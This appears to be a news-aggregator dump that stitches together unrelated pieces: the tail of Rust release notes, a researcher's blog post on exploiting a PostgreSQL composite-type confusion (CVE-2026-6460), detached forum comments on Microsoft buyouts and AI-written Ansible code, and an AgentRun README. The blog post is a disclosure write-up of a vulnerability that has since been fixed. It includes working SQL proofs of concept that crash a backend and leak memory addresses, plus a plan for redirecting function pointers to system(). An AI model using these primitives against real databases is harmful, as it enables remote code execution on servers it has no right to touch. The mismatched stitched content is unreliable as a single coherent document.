  • str::trim_suffix
  • [T]::trim_prefix
  • [T]::trim_suffix
  • Path::trim_prefix
  • Vec::from_fn
  • os::windows::process::CommandExt::show_window

Cargo

  • Introduced Cargo's own linting system: some Cargo warnings are now emitted as lints that users can control in the [lints.cargo] table. This includes a new built-in unused dependency check via the cargo::unused_dependencies lint. docs #17298
  • Introduced minimum publish age configurations, also known as dependency cooldowns. When the relevant config is set, the resolver ignores versions published more recently than that, unless they are already in Cargo.lock. (RFC 3923) docs #17335
  • cargo-install: now uses the existing lockfile in the .crate tarball by default. --locked in cargo install becomes a no-op. #17388
  • Cargo now uses a new directory layout for intermediate build artifacts. Tools that inspect the build directory may need to use Cargo’s JSON messages to locate build artifacts instead of relying on the build directory layout. The layout is not a stable interface and is subject to change. (build cache doc) #17354

Rustdoc

  • Add new invalid_markdown_table rustdoc lint

Compatibility Notes

  • Closures now more precisely capture variables used in if let. This may cause new errors
  • Check dyn-compatibility of trait objects in more places
  • Infallible is now a type alias to !
  • The never type fallback was changed to ! on all editions
  • box patterns are no longer syntactically allowed
  • Report Query Cycle errors in more cases when computing the layout of enums with explicit discriminants
  • Always escape grapheme extenders in str::escape_debug
  • Make let-else respect macro_rules expr metavariable grouping
  • Iterator::{min,max}(_by_key) changed which Ord methods they use. This cannot change behaviour (other than being potentially faster) for types correctly following the Ord rules, but may impact types with inconsistent trait implementations.
  • Emit an error when trying to enable SSE/AVX on an x86 (32bit or 64bit) softfloat target
  • Require windowed (and exception) for Xtensa ABI
  • windows-gnullvm: always link libunwind statically
  • From version 1.94 up to 1.100 a number of ARMv7-A hardfloat targets required the VFPv3-D32 FPU as a minimum, as they erroneously had the d32 feature in their baseline list of features. Breakage introduced as a result of correcting this can be fixed by passing -Ctarget-feature=+d32 to Rust.
  • Change "Rust" ABI on x86 to use SSE registers if they are always-available for the current target
  • Make the ambiguous_glob_imported_traits lint fire in slightly more cases
  • Make +fix-cortex-a53-835769 a default feature for aarch64-unknown-fuchsia
  • Some impls on Box have been generalised to arbitrary allocators, which may cause new type inference errors
  • The standard library now uses Unicode version 18.0.0
  • WASI SDK version was bumped from 33 to 34
  • On ARM targets, -Ctarget-feature/-Ctarget-cpu values that would alter the ABI are rejected as hard errors now.

Other

  • Test harness now allows passing --test-threads and --color multiple times, with later arguments overriding earlier ones

item.title: 22-Year-Old PostgreSQL Bug Turned into Remote Code Execution (195 pts)
item.description:
URL: https://mehmetince.net/part-3-6-how-i-ended-up-turning-a-22-year-old-postgresql-type-confusion-primitive-into-rce-cve-2026-6460/, See on Hacker News

If you had told me in April 2026 one question “Mehmet, can we use managed PostgreSQL for this project?” would send me into the deepest rabbit hole of my life, I would have laughed.

Months later, I finally found the bottom of that rabbit hole. It was a 22-year-old zero-day in PostgreSQL core.

In this blog post you will read a story of how I ended up uncovering a new class of type-confusion vulnerabilities in PostgreSQL.

This is the 3rd part of blog post series named “Systemic Risks in the Managed PostgreSQL Industry”. For those who have missed the first two part, feel free to start from 1st and 2nd which will give you a complete context of this madness.

TLDR:

I gave PostgreSQL a value inside a composite type, changed the type of one of its fields, and asked it to read the value back. That type confusion led to one of the most reliable memory-corruption exploit I have seen. But I did not start by looking for a PostgreSQL core vulnerability.

I was exploiting pg_clickhouse, and getting that exploit to work left me with a question about how PostgreSQL understands its own data. With an AI agent as my teacher, I worked through the internals one question at a time. Then a seemingly unrelated conversation gave me the idea that connected it all, and eventually I found myself staring at a primitive that had been there for for awhile.

This is the full true story of how those pieces came together, I am sure you will enjoy this story.

Beginning of August 2026

During June and July, I had been exploiting memory-corruption vulnerabilities across several PostgreSQL extensions. One of the extensions that I achieved code execution was pg_clickhouse. That case study has its own story, which I will share in the future.

What matters here is what that exploit forced me to learn. pg_clickhouse translates ClickHouse values into native PostgreSQL values. A ClickHouse Array is not a PostgreSQL array, right ? So the extension had to rebuild its elements as Datum values in the format that PostgreSQL expected. A mistake in that conversion was what eventually gave me a code execution.

This was my first time meeting with things like Datum, OIDs etc in the PostgreSQL universe. I learned only enough to finish the exploit, but one question remained in the back of my mind:

Somewhere around late July, I finally got my head out of the extensions and just followed that question into PostgreSQL core.

Disclaimer: I reported pg_clickhouse oob write + read chain to the vendor and they fixed it at Jun 23. 

PostgreSQL Types 101

I started learning with a very simple query. What happens when I run the simplest query SELECT 1337?

While I avoided all the black magic in Postgres internals, I kept this crash course on the basics of data types.

I start with this query.

SET debug_print_parse = on;
SELECT 1337;

The database scanner looks at the query, recognises SELECT as a keyword, and 1337 as an integer token. Then it creates a parse tree for the query. Next, PostgreSQL walks the tree and transforms it into a typed query tree.

{QUERY
   :commandType 1
   :targetList (
      {TARGETENTRY
         :expr
            {CONST
               :consttype 23 
               :consttypmod -1 
               :constlen 4 
               :constbyval true 
               :constisnull false 
               :location 7 
               :constvalue 4 [ 57 5 0 0 0 0 0 0 ]
            }
      }
   )
}

Parse tree looks like above. But I just wanted to better understand things like what is the consttype 23 ? why constvalue has [ 57 5 0 0 0 0 0 0 ]  and where is my 1337 value ? At this point, I asked Opus 5 to prepare me a full deep-dive course on PostgreSQL types.  Spending a few days around there and talking with my agent, whom I named pg_expert taught me these:

consttype   = 23      → int4
constlen    = 4       → four-byte payload
constbyval  = true    → stored by value
constisnull = false   → this is not NULL

constvalue 4 [ 57 5 0 0 0 0 0 0 ] can be converted to hexadecimal, making the value easier to recognize:

57 decimal = 0x39 
5 decimal = 0x05

On my little-endian system, the bytes were stored least-significant first:

39 05 00 00  →  0x00000539  →  1337

So 1337 had not disappeared.  But why do we even have 8 bytes [ 57 5 0 0 0 0 0 0 ] instead of simply 4 bytes ?

That was because constvalue was not declared as an int32. It was declared as a Datum, which was 8 bytes Our value 1337::int4 value stored at the lower four bytes of that generic carrier.

How can that same 8-byte Datum represent a text, an array, or custom types ?

A Datum Does Not Know What It Is

Chatting with my pg_expert agent taught me more. A Datum does NOT know what it represents.

The eight bytes carrying 1337 did not contain a hidden label saying “I am an integer.”. PostgreSQL knew its type only because of this consttype = 23.

That number is an OID (Object IDentifiers) pointing to a row in the pg_type system catalog

SELECT
    oid,
    typname,
    typlen,
    typbyval,
    typalign,
    typinput::regproc,
    typoutput::regproc
FROM pg_type
WHERE oid = 23;


 oid | typname | typlen | typbyval | typalign | typinput | typoutput
-----+---------+--------+----------+----------+----------+-----------
  23 | int4    |      4 | t        | i        | int4in   | int4out

That means the pg_type row shows what the value means and how PostgreSQL will use it. So far, it’s brilliant and easy to understand. But what about the text type ?

SELECT
    oid,
    typname,
    typlen,
    typbyval,
    typinput::regproc,
    typoutput::regproc
FROM pg_type
WHERE oid IN ('int4'::regtype, 'text'::regtype) // <== HERE FILTERIN THE INT4 and TEXT only
ORDER BY oid;


typname | typlen | typbyval | typinput | typoutput
---------+--------+----------+----------+-----------
 int4    |      4 | true     | int4in   | int4out
 text    |     -1 | false    | textin   | textout

For text, typlen = -1 means that the representation have a variable length. And typbyval = false means that the Datum carried a pointer.

Datum ──> pointer ──> variable-length text representation

So the same 8-byte value stores a memory address for the text. Datum can pass the value either by value itself or by reference to it. Nice, I love the elegant abstraction Datums provides!

Unknown is a type!

So far everything makes sense, but I wanted to better understand the  typinput and typoutput columns too. These functions convert the value provided by the query into a native Datum or vice versa. So I ran this again.

SELECT 1337, pg_typeof(1337), pg_column_size(1337);

 ?column? | pg_typeof | pg_column_size
----------+-----------+----------------
     1337 | integer   |              4

But then I added quotation marks to see if PostgreSQL has dynamic type casting/recognition or something:

SELECT pg_typeof('1337');

 pg_typeof
-----------
 unknown

I was a bit confused at this moment. I initially thought unknown meant “PostgreSQL does not know the type.” So I went back to chatting with my pg_expert agent, who is teaching me everything so far. I learned that unknown is an actual PostgreSQL type with OID 705, used for string literals whose final type hasn’t been decided yet!

Again, this makes super sense because PostgreSQL deliberately assigns untyped string literals this temporary type because the same text could eventually become many different things!

For example, the query supplies the target type int4. PostgreSQL looked up the typinput function for int4 and called int4in() and when its need to be printer it use int4out()

Critical Thinking: Wait a Minute! The Type Chooses the Code

Up until this point, typinput and typoutput looked like ordinary conversion mechanism to me. pg_type contained many different native functions for many different types.

While learning more about these functions, one detail stayed with me. An output function did not inspect a Datum and discover its type. It simply trusted all the values and flags around the Datum.

int4out() extracted an integer because PostgreSQL had already selected it as the output function for int4. A different output function could interpret the same generic carrier according to completely different rules.

I still remember that, at that very moment, I was actually thinking about the TOCTOU Vulnerabilities class of the web apps I have been exploiting/fixing for years and years.

If I can do this, we might be able to force PostgreSQL to process a Datum created for a completely different type as if it were the type the function expects. Having a type confusion in PostgreSQL can actually give me an opportunity to abuse all the other functions in PostgreSQL internals.

So I went back to learning more about what I can use to force PostgreSQL to natively call different types’ output functions for my int4 value. It turns out that the LANGUAGE internal feature can be used for that purpose.

LANGUAGE internal:  Type Confusion I Could Create on Purpose

The LANGUAGE internal allows a superuser to create an SQL function pointing to native code already compiled into PostgreSQL. I created the following one.

CREATE FUNCTION pg_temp.confused_textout(integer)
RETURNS cstring
AS 'textout'
LANGUAGE internal
STRICT;

Then I gave it the same int4 value. and my local-backend crashed!

SELECT pg_temp.confused_textout(1337);

server closed the connection unexpectedly
This probably means the server terminated abnormally before or while processing the request.

I’m pretty sure the PostgreSQL experts reading this wouldn’t be surprised by this crash, but it surprised me a lot!

It sent me in a completely different direction. I built a working exploit using this type-confusion feature to exploit LANGUAGE internal against security extensions deployed by managed PostgreSQL providers. That research eventually became a part of the Part 2 story.

For a while, I moved on and left this type-confusion question behind.

Roughly two weeks later, something completely unrelated brought me back to it.

Detour: Tomatoes and SQL Injection

Let me take a small detour. This Postgres article series is all about telling you my story in the end, isnt it ?

I do not remember the exact date, but during one of our runs or walks, my partner Bilge (Staff Machine Learning Engineer at EDB) and I were discussing second-order SQL injection in the PostgreSQL AI extensions and the possibility of tricking AI features of these extensions to hallucinate and produce malicious SQL queries.

That conversation led to chatting about prepared statements.

I first learned about SQL injection around 2005, and God knows how many times I have exploited it since.

Twenty years later, most libraries and frameworks still rely heavily on string escaping to generate secure SQL queries, even though RDBMSs have a beautiful feature named prepared statements.

I studied them when I was a uni student, mostly to see what could still be exploited even if the target app uses prepared statements. Things like triggering excessive SQL cold parsing and stuff like that.

But more importantly, for years I taught SQL Injection to thousands of my trainees with this concept:

In my version, the SQL query is the recipe and the values are the ingredients. Prepared statements let the database understand the recipe first, then receive the ingredients separately. So even a value like ' OR 1=1 -- may look evil, but it remains data and never gets the chance to rewrite the query.

I had always seen this separation as a security feature. But this time, I noticed something in the middle of the convo with Bilge. Databases can finish all the parsing first and wait for me to execute it. Before execution, I can run whatever query I want.

I can alter types before executing the query!

Uncovering 22-Year-Old PostgreSQL Type-Confusion Primitive

So the idea is simple; I could prepare a query, change something, and execute it later. But change what? PostgreSQL is not gonna let me redefine what the built-in types int4, text, or UUID mean.

I was not thinking about composite types at this point. Honestly, I barely knew what they were. I asked Claude agent pg_expert a much simpler question:

Which PostgreSQL types can I create, use inside a prepared query, and then alter it before running execute ?

That question led me to composite types. In PostgreSQL, a composite type represents the structure of a row. It is essentially a custom, user-defined data type that acts as a container for multiple fields, each with its own name and data type. [1, 2]

CREATE TYPE pg_temp.poc AS (
    key uuid
);

It had its own type OID, but its attributes defined the current row layout. I can change the attribute a type from UUID to another type without replacing the composite type itself.

The Crash

I created a one-field composite where the attribute started as UUID. Then I prepared a query, changed that attribute to bytea, and executed the prepared statement.

CREATE TYPE pg_temp.poc AS (key uuid);

PREPARE pc_crash AS
    SELECT '(01020000-0000-0000-0000-000000000000)'
           ::pg_temp.poc;

ALTER TYPE pg_temp.poc
    ALTER ATTRIBUTE key TYPE bytea CASCADE;

EXECUTE pc_crash;

And the result was a segfault!

client backend was terminated by signal 11: Segmentation fault
DETAIL: Failed process was running: EXECUTE pc_crash;

I knew I had found exactly the kind of type confusion I had been looking for!

I knew this was no longer a superuser-only LANGUAGE internal behaviour I had exploited before.

I knew that I could trigger this crash as a lowest-privileged login role on any PostgreSQL instance. Probably all the Postgres-compatible offerings too (more about this later)

Last but not least, I already knew that controlled UUID bytes reaching the wrong native consumer, bytea in my case, had serious exploitation potential. These two have the most reliable exploit primitive I have seen in the PostgreSQL exploits.

Before diving into the Hacking PostgreSQL internals, we need to learn a few things about PostgreSQL to better understand the rest of the article!

Quick Course: What is BYTEA ?

bytea is PostgreSQL’s data type for storing arbitrary binary data. Internally, it uses a variable-length representation called varlena. PostgreSQL places a small header before the bytes to describe their size and storage format.

Basic concepts of bytea

+----------------------+------------------------+
| 4-byte header       | binary payload         |
+----------------------+------------------------+

The header tells PostgreSQL which representation it is looking at and how large the complete value is.

We do not need to understand every varlena representation. For the rest of this article, we only need to know two things

Inline representation             →   the leading bytes can control the claimed length
External expanded representation  →  the leading bytes can introduce an internal object pointer

For example, a normal inline example of the five ASCII characters hello. That 24 can be decoded as 0x24 >> 2 which is 9. So 4-byte header + 5-byte payload = 9 bytes!

+----------------------+------------------+
| 24 00 00 00        | 68 65 6c 6c 6f     |
| 4-byte header      |      "hello"       |
+----------------------+------------------+

The most important example, external representation, when header starts with 01 PostgreSQL believes the value is not stored inline at all. Instead, it treats the bytes as a reference to an expanded object somewhere in memory.

+------------------+---------------------+----------------------------------+
| 01               | 02                  | 88 77 66 55 44 33 22 11          |
| external marker  | expanded-object tag | ExpandedObjectHeader * pointer   |
+------------------+---------------------+----------------------------------+

So the following data after the header is just object reference pointer instead of the data itself.

Crash and Root Cause Analysis

Lets get back to where we were.

The UUID I supplied contained exactly sixteen bytes, starting with 01 and 02. While attribute a was still UUID, there was nothing special about 01 02 or the fourteen zero bytes following it. They were simply controlled UUID data.

ALTER TYPE changed the current definition of attribute key from uuid to bytea, but it did not convert or rewrite the binary value already stored by the prepared query. During EXECUTE, PostgreSQL still had exactly the same bytes.

When we EXECUTE the query, PostgreSQL need to return the value of our type pg_temp.poc, in order to do that, it calls the composite output function, record_out().

So record_out() looks at the  pg_temp.poc’s attribute key and says ‘That is bytea’ and selects byteaout()

But the data  byteaout()  takes is our old UUID bytes that we can control. This is where the type confusion happens!

All of these means, we can literally create any varlena representation we want by fully controlling the headers and following 12 byte!

PostgreSQL thinks it needs to reach the ExpandedObjectHeader but its address is 00000000 because thats what we have written inside the UUID, therefore local-backend crash.

Before byteaout() could print the value, it first needed to convert this external representation into something it can print. I learned that PostgreSQL calls this process detoasting.

When we run EXECUTE pc_crash, the call path is as follows. The relevant path looked like this

EXECUTE pc_crash
  ├─ record_out()             a: bytea
  ├─ byteaout()               fetch + detoast
  ├─ detoast_external_attr()  01 02 → expanded
  ├─ DatumGetEOHP()           eohptr = NULL
  ├─ EOH_get_flat_size(NULL)
  └─ NULL->eoh_methods        SIGSEGV

PostgreSQL then passed the NULL pointer to EOH_get_flat_size(). The important line inside that function was effectively:

return eohptr->eoh_methods->get_flat_size(eohptr);

eohptr is what we influence and we choose 00000000 in our POC, which is a NULL. Therefore PostgreSQL crashed while trying to read its eoh_methods pointer because it believed it had received a valid external expanded object and followed the normal code path to process it.

The exploitation idea: replacing NULL with our fake object that could make PostgreSQL follow to our own choosen methods!

Hijacking control-flow via Fake ExpandedObjects contains Native Function Pointers

ExpandedObjectMethods contains two native function pointers

typedef struct ExpandedObjectMethods
{
    EOM_get_flat_size_method get_flat_size;
    EOM_flatten_into_method  flatten_into;
} ExpandedObjectMethods;

Normal code uses those methods like this to convert an expanded object into its flat representation whenever it’s needed.

EOH_get_flat_size(ExpandedObjectHeader *eohptr)
{
    return eohptr->eoh_methods->get_flat_size(eohptr);
}

EOH_flatten_into(ExpandedObjectHeader *eohptr,
                 void *result, Size allocated_size)
{
    eohptr->eoh_methods->flatten_into(eohptr, result, allocated_size);
}

This is not normally an attacker-controlled callback interface. These are trusted internal representations created by PostgreSQL. The output functions can assume the pointer, header, and methods table are not malicious.

These are indirect native function calls. PostgreSQL obtains the function addresses from the object’s methods table and then calls them. That is something we can actually use to change the control-flow path.

Before going further, I needed a simple model for the objects involved. I named the two fake objects according to what they represented

H = fake ExpandedObjectHeader
M = fake ExpandedObjectMethods table

So our plan is that the UUID pointed to H, H pointed to M, and M contained the native function addresses that we wanna cal.

Calling system($payload)

The important detail is that PostgreSQL used H twice. Lets remember the actual C code

eohptr->eoh_methods->get_flat_size(eohptr)
  │          │              │          │
  │          │              │          └── argument = H
  │          │              └───────────── function = system@plt
  │          └──────────────────────────── methods table = M
  └─────────────────────────────────────── object = H

First, it treated H as an ExpandedObjectHeader and read the eoh_methods pointer at offset +0x08.

That pointer led to M, where we had placed the address of system(). PostgreSQL then called the selected method and passed the original object pointer, H, as its first argument.

In other words, H helped PostgreSQL find system(), and then the same H was handed to system() as its parameter.

Fortunately, the first eight bytes of H came before the eoh_methods pointer. I could place the NULL-terminated command id>x in those bytes while keeping the address of M at offset +0x08.

Leaking Memory Addresses and defeating the ASLR with the same primitive

As I have heavily talked about exploiting extensions vulnerabilities on managed-Postgres providers at Part 1, we dont get to read /proc/self/mem due to hardening. Our exploitation plan is very clear but the challenge is we need to leak addresses of these objects.

I started to chatting with my pg_expert to find more about PostgreSQL operation that could return a pointer-valued data while SQL expected an ordinary integer. The moment I prompted the agent, it went to

It was a twist of fate. I had ended up exactly where the original idea had started.

PostgreSQL Arrays store their element type inside their binary representation. unnest() trusts that internal type when deciding how to extract each element.

Normally, everything agrees:

SELECT x
FROM unnest(ARRAY['hello']::text[]) AS item(x);

The array says its element is text, so unnest() returns a pointer-valued text Datum and SQL processes it as text.

But what if the array internally says text, while the surrounding SQL contract says bigint ?

Because text is passed by reference, unnest() returns a Datum containing the memory address of the text value! But the surrounding SQL expression expects a by-value bigint, so PostgreSQL prints those same pointer bits as an integer.

In other to say this, we can exploit exactly same type confusion vulnerability to alter the arrays’ text element type to bigint so that unnest() will return the memory address instead of the value! aka leaking memory address!

Creating a PostgreSQL Array data structures with UUID

The smallest PostgreSQL Array needs 48 bytes. A single UUID gives a 16 controlled bytes. So we can simply combine 3 UUIDs next to each other to build exactly 48 byte fully controlled data structer!

The animation above shows how three UUIDs become one 48-byte array carrier. I prepare those bytes while all three attributes are still UUIDs. From there, I exploit the same type confusion for only the first UUID a to bigint[]!

So unnest() extracts the element as text and returns its pointer, while SQL expects a bigint and exposes that pointer as a memory address. The final +4 skips the text header and lands on my controlled payload.

CREATE TYPE pg_temp.address_carrier AS (
    a uuid,
    b uuid,
    c uuid
);

CREATE FUNCTION pg_temp.leak_address(
    r pg_temp.address_carrier
)
RETURNS bigint
LANGUAGE plpgsql
AS $$
DECLARE
    pointer bigint;
BEGIN
    SELECT x INTO pointer
    FROM unnest(r.a) AS item(x)
    LIMIT 1;

    RETURN pointer + 4;
END
$$;

PREPARE address_leak AS
SELECT to_hex(pg_temp.leak_address(
    '(c0000000-0100-0000-0000-000019000000,01000000-0100-0000-5000-000011223344,55667788-99aa-bbcc-ddee-ff0000000000)'::pg_temp.address_carrier
));

ALTER TYPE pg_temp.address_carrier
    ALTER ATTRIBUTE a TYPE bigint[] CASCADE;

EXECUTE address_leak;


    to_hex    
--------------
 55f2a589ae0c
(1 row)

A direct text to bigint confusion would only reinterpret the old text bytes as an integer. The array was important because it forced PostgreSQL to first produce a real pointer and then expose those same pointer bits as a bigint.

POC Videos

CVE-2026-6460 Umbrella Fix and Variant Analysis of 21 more cases

Once I have reached that point, I started thinking about different scenarios of where we can alter the attribute types before execution. All the other possible ways of keeping the old value alive.

I found the same underlying mistake around RowExpr, JSON conversion caches and different places.

I reported 21 cases in total.

9 November 2026 The PostgreSQL security commits landed as part of a much larger release containing 52 new CVE.

6 of those 52 CVEs are directly connected to this article.

  • CVE-2026-6460 is the main umbrella fix for type confusion. It introduces composite attribute versioning,
  • CVE-2026-120142 anonymous RECORD descriptors.
  • CVE-2026-120148 backend-local anonymous-RECORD typmod
  • CVE-2026-116329 statistics import could publish values under an obsolete type
  • CVE-2026-116306 prevents ExecEvalFieldStore[De]Form from using a mismatched
  • CVE-2026-120139 integer overflow in tuple-size calculation

Coordinating this with managed-PostgreSQL Providers

The reason why I have fallen into that rabbit hole 5 months ago was because I needed to better understand the how managed-database industry works before making a decision because at the end of the day, we all can outsource the infrastructure but we can not outsource the risk.

So I ported the my locally working exploit to almost every managed PostgreSQL platform I know and privately shared reproducible PoCs with their security teams.

I haven’t seen any vendor who is not affected by this vulnerability! including those who has Postgres compatible offering.

Databricks security team engineers validated all the exploits immediately. Thanks to Aaron and his team.

Google escalated the AlloyDB reports to its highest priority P0. I am genuinely grateful of all the support from Google Cloud VRP team since day one!

SupaBase team received the full details around mid August. Thanks to endless support from the Etienne since I first contacted him.

Ubicloud members reached out to me after my part 1 article published and then they introduced me with the ClickHouse team. Both parties are also read in somewhere at end of August.

AWS Aurora/RDS and Microsoft Azure PostgreSQL teams received the reports and working PoC at mid August.

But what I respected the most is that some vendors brought their most senior engineering members to start implementing their own mitigation. They did not want to leave customers exposed while waiting for the upstream release cycle.

So yeah my whole August was like that.

Closing: Thank you PostgreSQL Communities and Core Security Team

I spent 20 years of my life around security communities around the globe. But I really need to say that the support, positive approach and the respect I have seen my time at PGCONF.eu this year was quite suprized me. Have no idea PostgreSQL community at europe has such a family kind vibe.

After my talk “Nobody Gets to Be Superuser (Until I Broke In)” at PGCONF.eu last month Valencia, I have received amazing support from everyone, specially the respected members of the community who are effortlessly fixing these vulnerabilities whenever someone sends an email to the securit@ address.

I owe so much of where I am today to open source. I’ve spent my life learning by hacking things, understanding how they work, and making them more secure. Being able to contribute to PostgreSQL and its ecosystem in my own way means a lot to me. Seeing those contributions so warmly welcomed means even more.

My talk this year was not recorded upon my request, but I receive a lot of invitation from different countries for their local PostgreSQL meetups.

If you’d like to hear the whole story, I’ll be presenting the 90 minutes edition of it at the Prague PostgreSQL Meetup on Monday, 30 November.

Come join me. I PROMISE IT’LL BE WORTH IT!
https://cloomba.com/e/prague-postgresql-meetup-8-2026-11-30

(If you’ve made it this far, I’d love to hear your thoughts! Feel free to leave a comment or ask me anything.)

Appendix: Dating the Primitive and the Duplicate Fiesta

The mutable-row-type primitive dates to commit 077db40fa1f3, introduced on May 5, 2004 with ALTER TABLE ... ALTER COLUMN ... TYPE.

The exploitation technique I used relies on commit 1dc5ebc9077a, introduced on May 14, 2015, which added expanded-object pointers and their native method callbacks. Later than many other primitives I discovered during exploiting 20+ variants.

I am not claiming that CVE-2026-6460 is exclusively “my vulnerability.” PostgreSQL treated it as an umbrella issue covering a much wider family of composite-type problems. Its commit credits many researchers whose reports may have involved overlapping discoveries, separate variants, or completely different journeys into the same systemic weakness.

That is the reality of vulnerability research in the age of AI. This article only tells the story of how I reached it without any cyber enabled models back in August 2026.

> Isn't this the company that is trying to get rid of 25% of their employees?

Just clarifying this in general, when a company makes a voluntary offer to some segment of employees, especially at this size, it is a statistics game of how many people accept the buy out.

They did not make the offer to 25% of the employees to downsize by 25%, they did it to downsize by 5% (or something like that), and then made the offer based on how many they expect to accept. This is specifically covered in this line of the geekwire article:

> Microsoft didn’t provide a projection for how many employees will accept, but the company told GeekWire it anticipates a much smaller share than the roughly 30% who took its earlier voluntary retirement offer, which went to longtime employees more likely to take the deal.

They probably expect 10-20% of those offered to take it, which would result in a 2.5-5% total downsizing.


Why do they offer these buy outs at all, doesn't the US have at will employment?

Or is this just a gesture of goodwill to avoid people jumping the ship on their own?


I think both parties probably benefit; people who are more likely to take the offer are those who have another reason to leave (unfulfilled, etc). This will benefit the company in the long run because they can eventually replace them with someone who want to join (people applying for the job).


Can go the other way though: people who've been there for a while, are motivated and back themselves to get another job will take redundancy (i.e. the people you want to keep).

People who aren't motivated and/or don't back themselves to get another job will stay (i.e. probably the people you want to get rid of)


If you lay people off, you’re on the hook for their unemployment. A voluntary buyout avoids that, and also avoids mandatory reporting for layoffs.


A layoff of any real size has negative impacts to their unemployment insurance premiums and restricts their ability to file PERM for employees. Meeting those targets with voluntary separation prevents those impacts.


You can at will fire but that doesnt stop lawsuits. Most of these require signing docs to get the payout. It is a way to cut cleanly and derisk the cut

AI agents should be able to resolve this quicker than employees, right?

Service quality is in better hands after the layoffs, at least that’s what investors are led to believe.


AI is good at incident diagnosis, but AI slop code may have actually caused this: designing to avoid cascading failures is something AI doesn't do so well


The place where I consistently see AI/LLMS/Agents/language-widgets-with-tools fail at making decent code (and more often configuration) is infrastructure.

The number of times it has spit out a python program where a much simpler bash script would do, is too many to count.

I have a pet theory that if you don't know what you really want, and aren't skilled enough to understand what you got, infra code is THE WORST.

Anecdote: I wanted a simple change to an ansible playbook today. GPT-6-Astra/codex came up with the most convoluted, brittle solution possible the first time, even though it was extending and already clear, idiomatic playbook. It took some amount of offensive and critical prompting to get it to use ansible's built in modules and tooling to do the same job - and do so with nearly 80% less configuration and like 1000% more human readability.

Some part of me harbours a sneaking suspicion that the "throw everything at it" ethos is by design, not as a defensive measure against crappy code, but as a way to ensure there's so much code and it's so convoluted orgs and operators (or developers) are stuck/addicted.

It's still a force multiplier - but it's by no means driverless, especially for existing/already-running infra.


I work as a (depressed lol) sysadmin apprentice in a small MSP company (I live in Europe) and boy do I got a story about Ansible playbooks: We made an offer to one of our clients to automate the deployment of software to their computers (this is a client with around 150-200 employees, depending on whether you count only the "core" employees or also security and maintenance staff). Before we made and implemented this offer using Ansible, they did not have any sort of Software Deployment tool whatsoever, everything got installed fully manually.

(they also used to have local admin rights on all of their client computers until one employee got phished and literally gave away their personal ID card via a webcam)

In any case, guess who got to implement all the relevant playbooks for installing software and what tool they used for it? Our company literally handed the job to an intern who had no IT background whatsoever. I say this not to be mean, he was legitimately just at our company because a government program required him to do an internship.

He used Deepseek (our company does not believe in purchasing LLM subscriptions, at least not for us normal employees) to write literally all of the playbooks for any kind of software that mattered to our clients.

Now, as I said before, I am only an apprentice, and I am certainly not a good programmer by any means, but I read through parts of the Ansible documentation and had worked with it before, and I understood enough to at least be able to roughly judge whether a playbook made sense or was just way too complicated and convoluted.

I had to help this intern out multiple times, because he hadn't yet understood that, in order to write a functioning playbook, you first had to somewhat understand how to deploy a piece of software on a single test machine using CMD or Powershell syntax with an according .exe or .msi.

He simply prompted, pasted the playbook and then reprompted with the error codes from the failed playbook until it somehow worked or until I had to help him out.

This took place in December or November of last year and the playbooks are mostly still pretty shitty if I am being honest.

I did take away an important lesson from this "episode", though: LLMs can be very usefuly for writing code, or in this case, Ansible playbooks, but only if you have a somewhat decent and basic grasp of how software installation works via CMD/powershell and if you took the time to read through and learn about at least the basic Ansible concepts.

Since I am only an apprentice (on paper and in terms of my knowledge and how I get paid, not in terms of how much I am expected to earn for the company), I have painfully experienced how important it is to possess a certain level of understanding about the infra-related code and scripts that you would like LLMs to write for you, because otherwise it very quickly spirals out of control and starts throwing everything at the problem, just as you described.

item.title: Show HN: AgentRun – open-source, Self-improving Managed Agents (102 pts)
item.description:
URL: https://github.com/Parcha-ai/agentrun/blob/main/README.md, See on Hacker News

Run smarter agents. Use fewer tokens.

Our code review bill went up 36x this year. Now a review costs us 18 cents. See how ↓

 

Quickstart · Case studies · Tour · Templates · Deploy · Docs

AgentRun is an open-source platform that supercharges your agents. It adds self-improvement, durable execution and a control plane on top of your favorite agent harness. Your agents become smarter, more fault tolerant and use fewer tokens with every run.


An agent's Learning tab: what it kept, and what changed since. Demo data from the console's recorded fixtures.

Case studies

Code review. Greptile started charging a dollar a review in March, then our agents took off, and our bill went from $180 a month to $6,451. So we built our own reviewer on a cheap model and tuned it on our own PRs. It costs 18 cents a review, and on 30 PRs it had never seen it caught 1.6x the real bugs Greptile did. How we built it · Tune one on your repo

Merchant codes. We let Opus figure out how to classify merchants, then handed what it learned to a cheap model. Same job, $0.89 down to $0.12 a merchant. How it works · Do it with your own job

Why AgentRun

Agents are great at figuring things out. The problem is they figure out the same things over and over. Give an agent a job it has done a hundred times and it rediscovers the same API, rereads the same docs and rebuilds the same plan, and you pay for every token of it.

Bring your agent on the harness it runs best on: Claude Code, Codex, OpenCode or pi. AgentRun does everything around it:

  • It learns the work. After each run, the agent keeps what will help next time: a note, a skill, or a workflow that does the job without the loop. The next run starts from there.
  • It never loses a run. Every run lives in one store. Kill the server mid-run, start it again, and the run carries on. Give each agent the computer the job needs: a sandbox, a Linux desktop, an Android phone or a browser.
  • You stay in control. Approvals, spend caps and one console for every agent: what needs you, what failed, what's running and what it cost.

You don't build the plumbing: provider integrations, recovery, run tracking and learning are all here. Run it on your laptop with one command, in one container, or as a server with runners. Apache-2.0.

Start in three steps

You need Node 24.22.3 or newer, on macOS or Linux.

  1. Start it.

    It starts the server and one runner on port 7340 (or the next free one), keeps everything in ~/.agentrun, and opens the console in your browser.

  2. Add one model key. In the console, set a password, then add a key under Settings → Model keys. One OPENROUTER_API_KEY gives every harness a model. An Anthropic key runs pi and Claude Code; an OpenAI key runs pi, Codex and OpenCode.

  3. Run your first agent. Open Templates, apply KYB due diligence, and start a run with a company's name and website. It needs nothing but your model key. When it finishes, the run's Report tab has a due diligence report with a verdict and every claim cited. Then open the agent's Learning tab to see what it kept for next time.

Rather have your coding agent do it? Tell it: Read agentrun.ai/SKILL.md and set up AgentRun for me.

Docker, sandboxes and running it on a server

If Docker is running on your machine, new agents get a Docker sandbox with a shell. Its image builds on first use, which takes a few minutes, and the console says when it's ready. Without Docker, agents still read and write files, but get no shell.

Want your own server with a URL? Deploy it to Render in one click.

Take the tour

Workflows that make the call. A step can ask a fast typed question, see how sure the answer is, and pick a route. Here the model leans approve at 0.61, below the workflow's 0.75 bar, so the case goes to review.

Every agent in one place. Mission Control opens first: what needs you, what failed, what's running and what it cost, by day, by harness and by tool.

Every agent is an API. Start a run from the Playground, then copy the same request into your code.

You stay in control. An agent can stop and ask you, and the run waits until you answer.

Agents that learn the work

